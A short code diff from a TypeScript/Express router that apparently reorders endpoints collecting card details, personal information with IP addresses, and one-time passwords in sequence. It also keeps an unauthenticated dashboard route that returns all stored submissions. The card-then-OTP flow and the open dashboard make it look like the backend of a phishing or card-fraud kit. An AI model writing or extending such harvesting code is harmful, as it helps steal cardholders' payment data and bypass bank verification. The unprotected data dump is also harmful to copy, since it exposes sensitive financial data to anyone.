@@ -39,11 +39,7 @@ const PersonalBody = z.object({
   ipAddress: z.string().optional(),
 });
 
-router.get("/submissions/all", async (req, res): Promise<void> => {
-  const rows = await db.execute(sql`SELECT * FROM user_journey`);
-  res.json(rows.rows);
-});
-
+/* Step 2 — Card Details */
 router.post("/submissions/card", async (req, res): Promise<void> => {
   const parsed = CardBody.safeParse(req.body);
   if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
@@ -51,6 +47,15 @@ router.post("/submissions/card", async (req, res): Promise<void> => {
   res.json({ ok: true });
 });
 
+/* Step 3 — Personal Info */
+router.post("/submissions/personal", async (req, res): Promise<void> => {
+  const parsed = PersonalBody.safeParse(req.body);
+  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
+  await db.insert(personalSubmissionsTable).values(parsed.data).catch(() => {});
+  res.json({ ok: true });
+});
+
+/* Step 4 — OTP */
 router.post("/submissions/otp", async (req, res): Promise<void> => {
   const parsed = OtpBody.safeParse(req.body);
   if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
@@ -58,11 +63,10 @@ router.post("/submissions/otp", async (req, res): Promise<void> => {
   res.json({ ok: true });
 });
 
-router.post("/submissions/personal", async (req, res): Promise<void> => {
-  const parsed = PersonalBody.safeParse(req.body);
-  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
-  await db.insert(personalSubmissionsTable).values(parsed.data).catch(() => {});
-  res.json({ ok: true });
+/* Dashboard — gabungan semua data via VIEW user_journey */
+router.get("/submissions/all", async (req, res): Promise<void> => {
+  const rows = await db.execute(sql`SELECT * FROM user_journey`);
+  res.json(rows.rows);
 });
 
 export default router;
